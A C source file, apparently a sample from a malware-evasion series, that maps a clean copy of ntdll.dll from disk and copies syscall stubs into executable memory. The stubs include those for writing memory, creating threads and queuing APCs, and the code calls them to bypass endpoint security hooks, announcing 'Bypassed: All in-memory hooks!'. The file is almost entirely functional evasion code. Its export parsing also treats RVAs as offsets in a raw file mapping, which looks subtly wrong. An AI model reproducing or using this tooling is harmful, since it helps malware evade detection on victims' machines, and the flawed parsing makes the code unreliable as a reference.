#include <Windows.h>
#include <stdio.h>

// FreshyCalls - Map clean ntdll from disk and extract fresh syscall stubs

typedef struct _SYSCALL_STUB
{
    BYTE *address;
    WORD syscallNumber;
    DWORD length;
    char name[64];
} SYSCALL_STUB;

SYSCALL_STUB GetFreshSyscallStub(const char *functionName)
{
    SYSCALL_STUB stub = {0};
    strcpy(stub.name, functionName);

    // 1. Map FRESH ntdll from disk
    HANDLE hFile = CreateFileA(
        "C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Failed to open ntdll.dll\n");
        return stub;
    }

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    CloseHandle(hFile);

    if (!hMapping)
        return stub;

    LPVOID freshNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMapping);

    if (!freshNtdll)
        return stub;

    // 2. Parse export table to find function
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)freshNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE *)freshNtdll + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)freshNtdll + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);

    DWORD *names = (DWORD *)((BYTE *)freshNtdll + pExport->AddressOfNames);
    DWORD *functions = (DWORD *)((BYTE *)freshNtdll + pExport->AddressOfFunctions);
    WORD *ordinals = (WORD *)((BYTE *)freshNtdll + pExport->AddressOfNameOrdinals);

    BYTE *functionAddr = NULL;
    for (DWORD i = 0; i < pExport->NumberOfNames; i++)
    {
        char *name = (char *)((BYTE *)freshNtdll + names[i]);
        if (strcmp(name, functionName) == 0)
        {
            functionAddr = (BYTE *)freshNtdll + functions[ordinals[i]];
            break;
        }
    }

    if (!functionAddr)
    {
        UnmapViewOfFile(freshNtdll);
        return stub;
    }

    // 3. Extract syscall stub
    for (int i = 0; i < 64; i++)
    {
        // Find "mov eax, SSRN" (b8 XX XX 00 00)
        if (functionAddr[i] == 0xB8)
        {
            stub.syscallNumber = *(WORD *)(functionAddr + i + 1);

            // Find syscall instruction (0F 05)
            for (int j = i; j < i + 20; j++)
            {
                if (functionAddr[j] == 0x0F && functionAddr[j + 1] == 0x05)
                {
                    stub.length = j + 2; // Include syscall + ret
                    break;
                }
            }

            if (stub.length == 0)
                stub.length = i + 6; // Fallback

            // Allocate executable memory for fresh stub
            stub.address = (BYTE *)VirtualAlloc(
                NULL,
                stub.length + 1,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);

            if (stub.address)
            {
                // Copy fresh stub
                memcpy(stub.address, functionAddr, stub.length);
                // Add ret instruction if not present
                if (stub.address[stub.length - 1] != 0xC3)
                    stub.address[stub.length] = 0xC3;
            }
            break;
        }
    }

    UnmapViewOfFile(freshNtdll);
    return stub;
}

int main()
{
    printf("[ FreshyCalls - Clean Syscall Stubs (x64) ]\n");
    printf("[*] Extracting fresh syscall stubs from disk ntdll\n\n");

    // Get FRESH syscall stubs directly from disk
    SYSCALL_STUB stubs[] = {
        GetFreshSyscallStub("NtAllocateVirtualMemory"),
        GetFreshSyscallStub("NtWriteVirtualMemory"),
        GetFreshSyscallStub("NtProtectVirtualMemory"),
        GetFreshSyscallStub("NtCreateThreadEx"),
        GetFreshSyscallStub("NtQueueApcThreadEx"),
        GetFreshSyscallStub("NtResumeThread"),
        GetFreshSyscallStub("NtDelayExecution")};

    for (int i = 0; i < sizeof(stubs) / sizeof(stubs[0]); i++)
    {
        if (stubs[i].address)
        {
            printf("[+] %s:\n", stubs[i].name);
            printf("    Stub address: 0x%p\n", stubs[i].address);
            printf("    Syscall number: 0x%04x\n", stubs[i].syscallNumber);
            printf("    Stub length: %d bytes\n", stubs[i].length);

            // Display first 16 bytes
            printf("    Bytes: ");
            for (int j = 0; j < 16 && j < stubs[i].length; j++)
                printf("%02x ", stubs[i].address[j]);
            printf("\n\n");
        }
    }

    // Use fresh NtAllocateVirtualMemory stub
    if (stubs[0].address)
    {
        printf("[*] Testing fresh NtAllocateVirtualMemory stub...\n");

        typedef NTSTATUS(NTAPI * pNtAllocateVirtualMemory)(
            HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);

        pNtAllocateVirtualMemory NtAllocate =
            (pNtAllocateVirtualMemory)stubs[0].address;

        PVOID baseAddr = NULL;
        SIZE_T size = 0x1000;

        NTSTATUS status = NtAllocate(
            GetCurrentProcess(),
            &baseAddr,
            0,
            &size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (status == 0)
        {
            printf("[+] SUCCESS: Memory allocated using FRESH syscall stub!\n");
            printf("[+] Bypassed: All in-memory hooks!\n");
            VirtualFree(baseAddr, 0, MEM_RELEASE);
        }
    }

    // Cleanup
    for (int i = 0; i < sizeof(stubs) / sizeof(stubs[0]); i++)
    {
        if (stubs[i].address)
            VirtualFree(stubs[i].address, 0, MEM_RELEASE);
    }

    return 0;
}

// x86_64-w64-mingw32-gcc -o 05_freshycalls.exe 05_freshycalls.c